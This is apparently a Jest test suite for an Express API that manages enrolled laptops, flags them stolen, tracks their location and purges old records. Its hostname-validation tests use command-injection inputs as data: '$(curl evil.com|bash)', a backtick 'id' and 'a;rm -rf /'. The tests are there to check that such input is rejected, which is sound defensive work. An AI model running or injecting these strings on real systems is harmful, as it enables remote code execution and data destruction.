const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const { mockPool } = require('./mockPool');
jest.mock('../src/db/pool', () => mockPool);

const devicesRoutes = require('../src/routes/devices');

const JWT_SECRET = 'test-secret-key-that-is-long-enough-for-validation-32';

function makeToken(adminId = 'admin-1', username = 'admin') {
  return jwt.sign({ id: adminId, username }, JWT_SECRET, { expiresIn: '1h' });
}

function createApp() {
  const app = express();
  app.use(express.json());
  app.use('/api/devices', devicesRoutes);
  return app;
}

beforeEach(() => {
  mockPool.query.reset();
});

// ---------------------------------------------------------------------------
// GET /api/devices
// ---------------------------------------------------------------------------

describe('GET /api/devices', () => {
  const app = createApp();

  test('rejects without auth token', async () => {
    const res = await request(app).get('/api/devices');
    expect(res.status).toBe(401);
  });

  test('returns list of devices', async () => {
    const devices = [
      { id: 'dev-1', hostname: 'DEV-001', owner_name: 'Alice', status: 'active' },
      { id: 'dev-2', hostname: 'DEV-002', owner_name: 'Bob', status: 'locked' },
    ];
    mockPool.query.setResult('SELECT * FROM devices ORDER BY', { rows: devices });

    const res = await request(app)
      .get('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body).toHaveLength(2);
    expect(res.body[0].hostname).toBe('DEV-001');
  });
});

// ---------------------------------------------------------------------------
// POST /api/devices (enroll)
// ---------------------------------------------------------------------------

describe('POST /api/devices (enroll)', () => {
  const app = createApp();

  test('creates a new device with per-device API key and audit log entry', async () => {
    const newDevice = { id: 'dev-new', hostname: 'DEV-NEW', owner_name: 'Charlie', status: 'active', api_key_hash: 'some-hash' };
    mockPool.query.setResult('INSERT INTO devices', { rows: [newDevice] });

    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'DEV-NEW', owner_name: 'Charlie' });

    expect(res.status).toBe(201);
    expect(res.body.hostname).toBe('DEV-NEW');
    // FA3: enrollment returns a per-device API key (plaintext, shown once)
    expect(res.body.api_key).toBeDefined();
    expect(typeof res.body.api_key).toBe('string');
    expect(res.body.api_key.length).toBeGreaterThan(0);

    // Verify audit log was written
    const auditCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO audit_log') && c[1].includes('device_enrolled')
    );
    expect(auditCall).toBeDefined();
  });

  test('returns 400 if hostname or owner_name missing', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'DEV-NEW' });

    expect(res.status).toBe(400);
  });

  // -------------------------------------------------------------------------
  // Security: hostname charset validation at creation (command-injection fix)
  // device.hostname is admin-supplied here and later interpolated into
  // generated PowerShell/bash install scripts. A malicious hostname like
  // $(curl evil.com|bash) must be rejected at the input boundary.
  // -------------------------------------------------------------------------

  test('rejects command-injection hostname at creation (Layer 1)', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: '$(curl evil.com|bash)', owner_name: 'Mal' });

    expect(res.status).toBe(400);
    expect(res.body.error).toBeDefined();
    // Must NOT have inserted the device or written an audit entry
    const insertCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO devices')
    );
    expect(insertCall).toBeUndefined();
  });

  test('rejects backtick command-injection hostname at creation', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: '`id`', owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('rejects hostname with shell metacharacters (semicolon, pipe, $)', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'a;rm -rf /', owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('rejects hostname with spaces', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'bad host', owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('rejects hostname with a leading hyphen', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: '-bad', owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('rejects hostname with a trailing hyphen', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'bad-', owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('rejects hostname containing a dot (outside safe charset)', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'host.example.com', owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('rejects hostname longer than 63 characters', async () => {
    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'a'.repeat(64), owner_name: 'Mal' });

    expect(res.status).toBe(400);
  });

  test('accepts a valid RFC-label hostname (guards against over-rejection)', async () => {
    const newDevice = { id: 'dev-ok', hostname: 'DEV-001', owner_name: 'Alice', status: 'active', api_key_hash: 'h' };
    mockPool.query.setResult('INSERT INTO devices', { rows: [newDevice] });

    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'DEV-001', owner_name: 'Alice' });

    expect(res.status).toBe(201);
    expect(res.body.hostname).toBe('DEV-001');
  });

  test('accepts a single-character alphanumeric hostname', async () => {
    const newDevice = { id: 'dev-ok', hostname: 'X', owner_name: 'Alice', status: 'active', api_key_hash: 'h' };
    mockPool.query.setResult('INSERT INTO devices', { rows: [newDevice] });

    const res = await request(app)
      .post('/api/devices')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname: 'X', owner_name: 'Alice' });

    expect(res.status).toBe(201);
  });
});

// ---------------------------------------------------------------------------
// POST /api/devices/:id/flag-stolen
// ---------------------------------------------------------------------------

describe('POST /api/devices/:id/flag-stolen', () => {
  const app = createApp();

  test('flags device as stolen and queues lockdown command', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', owner_name: 'Alice', status: 'active' };
    const cmd = { id: 'cmd-1', device_id: 'dev-1', command_type: 'lockdown', status: 'pending' };

    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/flag-stolen')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    expect(res.status).toBe(200);
    expect(res.body.device.status).toBe('stolen');
    expect(res.body.command.command_type).toBe('lockdown');

    // Verify status was updated to stolen
    const statusCall = mockPool.query.mock.calls.find(
      c => c[0].includes("UPDATE devices SET status = $1") && c[1][0] === 'stolen'
    );
    expect(statusCall).toBeDefined();
  });

  test('rejects if hostname_confirm does not match', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'active' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/flag-stolen')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'WRONG-HOSTNAME' });

    expect(res.status).toBe(400);
  });

  test('rejects if device already stolen', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'stolen' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/flag-stolen')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    expect(res.status).toBe(409);
  });
});

// ---------------------------------------------------------------------------
// POST /api/devices/:id/recover
// ---------------------------------------------------------------------------

describe('POST /api/devices/:id/recover', () => {
  const app = createApp();

  test('sets status to recovering (not active) and queues unlock', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'stolen' };
    const key = { id: 'key-1', key_material: 'fernet-key==', released_at: null };
    const cmd = { id: 'cmd-2', command_type: 'unlock', status: 'pending' };

    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('SELECT * FROM encryption_keys', { rows: [key] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/recover')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    expect(res.status).toBe(200);
    // KEY FIX: status should be 'recovering', NOT 'active'
    expect(res.body.device.status).toBe('recovering');
    expect(res.body.command.command_type).toBe('unlock');
    expect(res.body.key_released).toBe(true);
    expect(res.body.key_material).toBe('fernet-key==');

    // Verify status was set to recovering
    const statusCall = mockPool.query.mock.calls.find(
      c => c[0].includes("UPDATE devices SET status = $1") && c[1][0] === 'recovering'
    );
    expect(statusCall).toBeDefined();
  });

  test('allows recovery from locked status (not just stolen)', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'locked' };
    const key = { id: 'key-1', key_material: 'fernet-key==', released_at: null };
    const cmd = { id: 'cmd-2', command_type: 'unlock', status: 'pending' };

    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('SELECT * FROM encryption_keys', { rows: [key] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/recover')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    expect(res.status).toBe(200);
    expect(res.body.device.status).toBe('recovering');
  });

  test('rejects if device is already active', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'active' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/recover')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    expect(res.status).toBe(409);
  });

  test('rejects if device is already recovering', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'recovering' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/recover')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    expect(res.status).toBe(409);
  });

  test('rejects if hostname_confirm does not match', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'stolen' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/recover')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'WRONG' });

    expect(res.status).toBe(400);
  });

  test('marks encryption key as released', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'stolen' };
    const key = { id: 'key-1', key_material: 'fernet-key==', released_at: null };
    const cmd = { id: 'cmd-2', command_type: 'unlock', status: 'pending' };

    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('SELECT * FROM encryption_keys', { rows: [key] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    await request(app)
      .post('/api/devices/dev-1/recover')
      .set('Authorization', `Bearer ${makeToken()}`)
      .send({ hostname_confirm: 'DEV-001' });

    const releaseCall = mockPool.query.mock.calls.find(
      c => c[0].includes('UPDATE encryption_keys SET released_at')
    );
    expect(releaseCall).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// POST /api/devices/:id/track
// ---------------------------------------------------------------------------
describe('POST /api/devices/:id/track', () => {
  const app = createApp();

  test('queues track command for stolen device', async () => {
    // FA5: track is gated to stolen/locked/recovering
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'stolen' };
    const cmd = { id: 'cmd-1', command_type: 'track' };

    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body.command.command_type).toBe('track');

    // Verify audit log entry
    const auditCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO audit_log') &&
           c[1].includes('start_tracking')
    );
    expect(auditCall).toBeDefined();
  });

  test('FA5: rejects track for active device (status gating)', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'active' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(403);
    // Verify track_denied audit entry
    const auditCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO audit_log') &&
           c[1].includes('track_denied')
    );
    expect(auditCall).toBeDefined();
  });

  test('FA5: allows track for locked device', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'locked' };
    const cmd = { id: 'cmd-1', command_type: 'track' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
  });

  test('rejects if device is already tracking', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'tracking' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(409);
  });

  test('returns 404 if device not found', async () => {
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [] });

    const res = await request(app)
      .post('/api/devices/nonexistent/track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(404);
  });
});

// ---------------------------------------------------------------------------
// POST /api/devices/:id/stop-track
// ---------------------------------------------------------------------------
describe('POST /api/devices/:id/stop-track', () => {
  const app = createApp();

  test('queues stop_track command for tracking device', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'tracking' };
    const cmd = { id: 'cmd-1', command_type: 'stop_track' };

    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/stop-track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body.command.command_type).toBe('stop_track');

    const auditCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO audit_log') &&
           c[1].includes('stop_tracking')
    );
    expect(auditCall).toBeDefined();
  });

  test('rejects if device is not tracking', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'active' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/stop-track')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(409);
  });
});

// ---------------------------------------------------------------------------
// GET /api/devices/:id/locations
// ---------------------------------------------------------------------------
describe('GET /api/devices/:id/locations', () => {
  const app = createApp();

  test('returns location history', async () => {
    const locations = [
      { id: 'loc-1', latitude: 37.77, longitude: -122.41, source: 'wifi', reported_at: '2025-01-01T00:00:00Z' },
      { id: 'loc-2', latitude: 40.71, longitude: -74.00, source: 'ip', reported_at: '2025-01-02T00:00:00Z' },
    ];
    mockPool.query.setResult('SELECT * FROM location_reports', { rows: locations });

    const res = await request(app)
      .get('/api/devices/dev-1/locations')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body).toHaveLength(2);
    expect(res.body[0].latitude).toBe(37.77);
  });

  test('returns empty array if no locations', async () => {
    mockPool.query.setResult('SELECT * FROM location_reports', { rows: [] });

    const res = await request(app)
      .get('/api/devices/dev-1/locations')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// GET /api/devices/:id/location/latest
// ---------------------------------------------------------------------------
describe('GET /api/devices/:id/location/latest', () => {
  const app = createApp();

  test('returns latest location', async () => {
    const loc = { id: 'loc-1', latitude: 37.77, longitude: -122.41, source: 'wifi', city: 'SF' };
    mockPool.query.setResult('SELECT * FROM location_reports', { rows: [loc] });

    const res = await request(app)
      .get('/api/devices/dev-1/location/latest')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body.city).toBe('SF');
  });

  test('returns 404 if no location data', async () => {
    mockPool.query.setResult('SELECT * FROM location_reports', { rows: [] });

    const res = await request(app)
      .get('/api/devices/dev-1/location/latest')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(404);
  });
});

// ---------------------------------------------------------------------------
// FA5: POST /api/devices/:id/locate — status gating
// ---------------------------------------------------------------------------

describe('FA5: POST /api/devices/:id/locate (status gating)', () => {
  const app = createApp();

  test('allows locate for stolen device', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'stolen' };
    const cmd = { id: 'cmd-1', command_type: 'locate' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/locate')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
    expect(res.body.command.command_type).toBe('locate');
  });

  test('allows locate for tracking device', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'tracking' };
    const cmd = { id: 'cmd-1', command_type: 'locate' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });
    mockPool.query.setResult('INSERT INTO commands', { rows: [cmd] });

    const res = await request(app)
      .post('/api/devices/dev-1/locate')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(200);
  });

  test('FA5: rejects locate for active device (status gating)', async () => {
    const device = { id: 'dev-1', hostname: 'DEV-001', status: 'active' };
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [device] });

    const res = await request(app)
      .post('/api/devices/dev-1/locate')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(403);
    // Verify locate_denied audit entry
    const auditCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO audit_log') &&
           c[1].includes('locate_denied')
    );
    expect(auditCall).toBeDefined();
  });

  test('returns 404 if device not found', async () => {
    mockPool.query.setResult('SELECT * FROM devices WHERE id', { rows: [] });

    const res = await request(app)
      .post('/api/devices/nonexistent/locate')
      .set('Authorization', `Bearer ${makeToken()}`);

    expect(res.status).toBe(404);
  });
});

// ---------------------------------------------------------------------------
// FA5: Retention scheduler tests
// ---------------------------------------------------------------------------

describe('FA5: Retention scheduler', () => {
  const { runRetentionPurge, startScheduler, stopScheduler } = require('../src/jobs/retentionScheduler');

  beforeEach(() => {
    mockPool.query.reset();
  });

  test('runRetentionPurge deletes old location reports and writes audit log', async () => {
    // Mock: advisory lock succeeds, DELETE returns 5 rows, audit insert succeeds
    let callIdx = 0;
    mockPool.query.mockImplementation(async (sql) => {
      callIdx++;
      if (sql.includes('pg_try_advisory_lock')) {
        return { rows: [{ pg_try_advisory_lock: true }] };
      }
      if (sql.includes('DELETE FROM location_reports')) {
        return { rows: [{ id: 'loc-1' }, { id: 'loc-2' }, { id: 'loc-3' }], rowCount: 3 };
      }
      if (sql.includes('INSERT INTO audit_log')) {
        return { rows: [] };
      }
      if (sql.includes('pg_advisory_unlock')) {
        return { rows: [{ pg_advisory_unlock: true }] };
      }
      return { rows: [] };
    });

    // Mock connect() to return a client with query + release
    const mockClient = {
      query: mockPool.query,
      release: jest.fn(),
    };
    mockPool.connect = jest.fn(async () => mockClient);

    const result = await runRetentionPurge();

    expect(result.rowsDeleted).toBe(3);
    expect(result.skipped).toBe(false);

    // Verify audit log was written
    const auditCall = mockPool.query.mock.calls.find(
      c => c[0].includes('INSERT INTO audit_log') &&
           c[1].includes('retention_purge')
    );
    expect(auditCall).toBeDefined();
  });

  test('runRetentionPurge skips if advisory lock not acquired', async () => {
    mockPool.query.mockImplementation(async (sql) => {
      if (sql.includes('pg_try_advisory_lock')) {
        return { rows: [{ pg_try_advisory_lock: false }] };
      }
      if (sql.includes('pg_advisory_unlock')) {
        return { rows: [{ pg_advisory_unlock: true }] };
      }
      return { rows: [] };
    });

    const mockClient = {
      query: mockPool.query,
      release: jest.fn(),
    };
    mockPool.connect = jest.fn(async () => mockClient);

    const result = await runRetentionPurge();

    expect(result.rowsDeleted).toBe(0);
    expect(result.skipped).toBe(true);
  });

  test('startScheduler and stopScheduler work without errors', async () => {
    // Use a short interval for testing
    startScheduler(100);
    // Stop immediately
    await stopScheduler(500);
    // No error means success
  });
});
